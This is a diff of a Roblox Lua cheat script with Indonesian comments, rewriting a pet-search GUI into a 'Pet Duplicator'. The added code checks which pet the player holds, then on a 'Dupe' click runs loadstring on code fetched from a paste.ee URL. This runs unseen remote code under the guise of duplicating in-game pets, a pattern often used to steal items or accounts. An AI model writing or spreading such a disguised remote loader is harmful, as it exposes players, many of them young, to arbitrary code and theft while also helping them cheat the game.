@@ -4,14 +4,14 @@ local gui = player:WaitForChild("PlayerGui")
 
 -- GUI Utama
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "KyroscScriptsGUI"
+screenGui.Name = "PetDuplicatorGUI"
 screenGui.Parent = gui
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 300, 0, 320)  -- diperbesar untuk hasil pencarian
-mainFrame.Position = UDim2.new(0.5, -150, 0.5, -160)
+mainFrame.Size = UDim2.new(0, 300, 0, 180)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
 mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 mainFrame.BorderSizePixel = 0
@@ -21,28 +21,10 @@ local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0, 8)
 corner.Parent = mainFrame
 
--- Tombol toggle GUI (sembunyi/tampil)
-local toggleButton = Instance.new("TextButton")
-toggleButton.Name = "ToggleButton"
-toggleButton.Size = UDim2.new(0, 40, 0, 40)
-toggleButton.Position = UDim2.new(0.5, 170, 0.5, -160)  -- di kanan mainFrame
-toggleButton.AnchorPoint = Vector2.new(0, 0)
-toggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-toggleButton.BorderSizePixel = 0
-toggleButton.Text = "☰"
-toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-toggleButton.Font = Enum.Font.GothamBold
-toggleButton.TextSize = 24
-toggleButton.Parent = screenGui
-
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 6)
-toggleCorner.Parent = toggleButton
-
--- Judul (tempat drag)
+-- Judul
 local title = Instance.new("TextLabel")
 title.Name = "Title"
-title.Text = "KyroscScripts (v3.2.1)"
+title.Text = "Pet Duplicator"
 title.Size = UDim2.new(1, 0, 0, 30)
 title.Position = UDim2.new(0, 0, 0, 10)
 title.BackgroundTransparency = 1
@@ -51,63 +33,36 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 16
 title.Parent = mainFrame
 
--- Instruksi Pet
-local petInstructions = Instance.new("TextLabel")
-petInstructions.Name = "PetInstructions"
-petInstructions.Text = "Hold one of these pets:\n- Red Fox - Dragonfly\n- Raccoon - Praying Mantis\n- Deer\nThen click to start."
-petInstructions.Size = UDim2.new(0.9, 0, 0, 80)
-petInstructions.Position = UDim2.new(0.05, 0, 0, 40)
-petInstructions.BackgroundTransparency = 1
-petInstructions.TextColor3 = Color3.fromRGB(200, 200, 200)
-petInstructions.Font = Enum.Font.Gotham
-petInstructions.TextSize = 13
-petInstructions.TextXAlignment = Enum.TextXAlignment.Left
-petInstructions.TextYAlignment = Enum.TextYAlignment.Top
-petInstructions.Parent = mainFrame
+-- Instruksi
+local instructions = Instance.new("TextLabel")
+instructions.Name = "Instructions"
+instructions.Text = "Hold one of these pets:\n- Red Fox\n- Dragonfly\n- Raccoon\nThen click Dupe button"
+instructions.Size = UDim2.new(0.9, 0, 0, 80)
+instructions.Position = UDim2.new(0.05, 0, 0, 40)
+instructions.BackgroundTransparency = 1
+instructions.TextColor3 = Color3.fromRGB(200, 200, 200)
+instructions.Font = Enum.Font.Gotham
+instructions.TextSize = 13
+instructions.TextXAlignment = Enum.TextXAlignment.Left
+instructions.TextYAlignment = Enum.TextYAlignment.Top
+instructions.Parent = mainFrame
 
--- Frame hasil pencarian
-local resultsFrame = Instance.new("ScrollingFrame")
-resultsFrame.Name = "ResultsFrame"
-resultsFrame.Size = UDim2.new(0.9, 0, 0, 100)
-resultsFrame.Position = UDim2.new(0.05, 0, 0, 125)
-resultsFrame.BackgroundTransparency = 1
-resultsFrame.BorderSizePixel = 0
-resultsFrame.ScrollBarThickness = 5
-resultsFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
-resultsFrame.Parent = mainFrame
-
-local resultsLayout = Instance.new("UIListLayout")
-resultsLayout.Padding = UDim.new(0, 5)
-resultsLayout.Parent = resultsFrame
-
--- Tombol Start
-local startButton = Instance.new("TextButton")
-startButton.Name = "StartButton"
-startButton.Text = "Start Execution"
-startButton.Size = UDim2.new(0.9, 0, 0, 40)
-startButton.Position = UDim2.new(0.05, 0, 0, 230)
-startButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-startButton.BorderSizePixel = 0
-startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-startButton.Font = Enum.Font.GothamBold
-startButton.TextSize = 14
-startButton.Parent = mainFrame
+-- Tombol Dupe
+local dupeButton = Instance.new("TextButton")
+dupeButton.Name = "DupeButton"
+dupeButton.Text = "Dupe"
+dupeButton.Size = UDim2.new(0.9, 0, 0, 40)
+dupeButton.Position = UDim2.new(0.05, 0, 0, 130)
+dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+dupeButton.BorderSizePixel = 0
+dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+dupeButton.Font = Enum.Font.GothamBold
+dupeButton.TextSize = 14
+dupeButton.Parent = mainFrame
 
 local buttonCorner = Instance.new("UICorner")
 buttonCorner.CornerRadius = UDim.new(0, 6)
-buttonCorner.Parent = startButton
-
--- Footer
-local footer = Instance.new("TextLabel")
-footer.Name = "Footer"
-footer.Text = "KyroscScripts | discord.gg/SqqvAH7nXf"
-footer.Size = UDim2.new(1, 0, 0, 20)
-footer.Position = UDim2.new(0, 0, 1, -20)
-footer.BackgroundTransparency = 1
-footer.TextColor3 = Color3.fromRGB(150, 150, 150)
-footer.Font = Enum.Font.Gotham
-footer.TextSize = 12
-footer.Parent = mainFrame
+buttonCorner.Parent = dupeButton
 
 -- Notifikasi
 local function showNotification(message, color)
@@ -132,213 +87,79 @@ local function showNotification(message, color)
     end)
 end
 
--- Fungsi rekursif pencarian item "Deer"
-local function deepFindDeer(parent, path)
-    local results = {}
-    
-    for _, child in ipairs(parent:GetChildren()) do
-        if child:IsA("Tool") and child.Name:lower():find("deer") then
-            table.insert(results, {
-                object = child,
-                path = path..child.Name
-            })
-        end
-
-        if child:IsA("Folder") or child:IsA("Model") then
-            local subResults = deepFindDeer(child, path..child.Name.." > ")
-            for _, res in ipairs(subResults) do
-                table.insert(results, res)
-            end
-        end
-    end
-    
-    return results
-end
-
--- Fungsi bersihkan hasil pencarian
-local function clearResults()
-    for _, child in ipairs(resultsFrame:GetChildren()) do
-        if not child:IsA("UIListLayout") then
-            child:Destroy()
-        end
-    end
-end
-
--- Fungsi tampilkan hasil pencarian
-local function displayResults(results)
-    clearResults()
-    if #results == 0 then
-        local noResult = Instance.new("TextLabel")
-        noResult.Name = "NoResult"
-        noResult.Text = "No Deer found anywhere"
-        noResult.Size = UDim2.new(1, 0, 0, 20)
-        noResult.BackgroundTransparency = 1
-        noResult.TextColor3 = Color3.fromRGB(255, 50, 50)
-        noResult.Font = Enum.Font.Gotham
-        noResult.TextSize = 14
-        noResult.Parent = resultsFrame
-        return
-    end
-
-    for _, result in ipairs(results) do
-        local label = Instance.new("TextLabel")
-        label.Name = "ResultLabel"
-        label.Text = result.path .. " (Type: "..result.object.ClassName..")"
-        label.Size = UDim2.new(1, 0, 0, 20)
-        label.BackgroundTransparency = 1
-        label.TextColor3 = Color3.fromRGB(200, 200, 200)
-        label.Font = Enum.Font.Gotham
-        label.TextSize = 13
-        label.TextXAlignment = Enum.TextXAlignment.Left
-        label.Parent = resultsFrame
-    end
-end
-
--- Lokasi penting untuk pencarian
-local importantLocations = {
-    game:GetService("Workspace"),
-    game:GetService("ReplicatedStorage"),
-    game:GetService("ServerStorage"),
-    game:GetService("StarterPack"),
-    game:GetService("StarterGui"),
-    player.Character or player:WaitForChild("Character"),
-    player:FindFirstChild("Backpack") or player:WaitForChild("Backpack")
-}
-
--- Fungsi pencarian utama
-local function deepSearch()
-    startButton.Text = "Searching..."
-    startButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
-
-    local allResults = {}
-
-    for _, location in ipairs(importantLocations) do
-        if location then
-            local results = deepFindDeer(location, location.Name .. " > ")
-            for _, res in ipairs(results) do
-                table.insert(allResults, res)
-            end
-        end
-    end
-
-    displayResults(allResults)
-    startButton.Text = "Search Complete"
-    startButton.BackgroundColor3 = #allResults > 0 and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
-
-    wait(2)
-    startButton.Text = "Start Execution"
-    startButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-end
-
--- Fungsi cek apakah player memegang pet bernama "Deer"
-local function isHoldingDeer()
-    local character = player.Character or player.CharacterAdded:Wait()
-
-    for _, item in ipairs(character:GetChildren()) do
-        if string.lower(item.Name) == "deer" then
-            return true
-        end
-    end
-
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _, tool in ipairs(backpack:GetChildren()) do
-            if string.lower(tool.Name) == "deer" then
-                return true
-            end
-        end
-    end
-
-    return false
-end
-
--- Start button klik event
-startButton.MouseButton1Click:Connect(function()
-    -- Periksa pet
+-- Fungsi untuk mencari pet yang valid
+local function findValidPet()
     local validPets = {
-        ["red fox"] = true,
-        ["dragonfly"] = true,
-        ["raccoon"] = true,
-        ["praying mantis"] = true,
-        ["deer"] = true,
+        ["Red Fox"] = true,
+        ["Dragonfly"] = true,
+        ["Raccoon"] = true
     }
 
-    local holdingValidPet = false
-    local character = player.Character or player.CharacterAdded:Wait()
-    
-    -- Check if player holds any valid pet
-    for _, child in ipairs(character:GetChildren()) do
-        if child:IsA("Tool") and validPets[string.lower(child.Name)] then
-            holdingValidPet = true
-            break
-        end
-    end
-
-    if not holdingValidPet then
-        local backpack = player:FindFirstChild("Backpack")
-        if backpack then
-            for _, tool in ipairs(backpack:GetChildren()) do
-                if tool:IsA("Tool") and validPets[string.lower(tool.Name)] then
-                    holdingValidPet = true
-                    break
-                end
+    -- Cek di karakter pemain
+    local character = player.Character
+    if character then
+        for _, item in ipairs(character:GetChildren()) do
+            if item:IsA("Tool") and validPets[item.Name] then
+                return item
             end
         end
     end
 
-    if not holdingValidPet then
-        showNotification("You must hold one of these pets first!\nRed Fox, Dragonfly, Raccoon, Praying Mantis, Deer", Color3.fromRGB(255, 50, 50))
+    -- Cek di backpack
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, item in ipairs(backpack:GetChildren()) do
+            if item:IsA("Tool") and validPets[item.Name] then
+                return item
+            end
+        end
+    end
+
+    return nil
+end
+
+-- Fungsi untuk mengeksekusi script dupe
+local function executeDupeScript()
+    local pet = findValidPet()
+    
+    if not pet then
+        showNotification("No valid pet found!", Color3.fromRGB(255, 50, 50))
         return
     end
 
-    deepSearch()
-end)
+    showNotification("Starting dupe process...", Color3.fromRGB(0, 150, 0))
+    dupeButton.Text = "Duping..."
+    dupeButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
 
--- Fitur drag GUI (drag dari title)
-local dragging = false
-local dragInput, dragStart, startPos
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://paste.ee/r/s7TguhY5"))()
+    end)
 
-title.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = mainFrame.Position
-
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-title.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        dragInput = input
-    end
-end)
-
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        local delta = input.Position - dragStart
-        mainFrame.Position = UDim2.new(
-            math.clamp(startPos.X.Scale, 0, 1),
-            math.clamp(startPos.X.Offset + delta.X, 0, workspace.CurrentCamera.ViewportSize.X - mainFrame.AbsoluteSize.X),
-            math.clamp(startPos.Y.Scale, 0, 1),
-            math.clamp(startPos.Y.Offset + delta.Y, 0, workspace.CurrentCamera.ViewportSize.Y - mainFrame.AbsoluteSize.Y)
-        )
-        toggleButton.Position = UDim2.new(mainFrame.Position.X.Scale, mainFrame.Position.X.Offset + mainFrame.AbsoluteSize.X + 10, mainFrame.Position.Y.Scale, mainFrame.Position.Y.Offset)
-    end
-end)
-
--- Tombol toggle GUI
-local guiVisible = true
-toggleButton.MouseButton1Click:Connect(function()
-    guiVisible = not guiVisible
-    mainFrame.Visible = guiVisible
-    if guiVisible then
-        toggleButton.Text = "☰"
+    if success then
+        showNotification("Dupe script executed!", Color3.fromRGB(0, 200, 0))
     else
-        toggleButton.Text = "❌"
+        showNotification("Error: " .. tostring(err), Color3.fromRGB(255, 50, 50))
+        warn("Execution error: " .. tostring(err))
+    end
+
+    dupeButton.Text = "Dupe"
+    dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+end
+
+-- Event klik tombol
+dupeButton.MouseButton1Click:Connect(executeDupeScript)
+
+-- Auto update ketika karakter berubah
+player.CharacterAdded:Connect(function()
+    wait(1) -- Beri waktu untuk load item
+    if findValidPet() then
+        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    else
+        dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
     end
 end)
+
+-- Update status awal
+if findValidPet() then
+    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+end
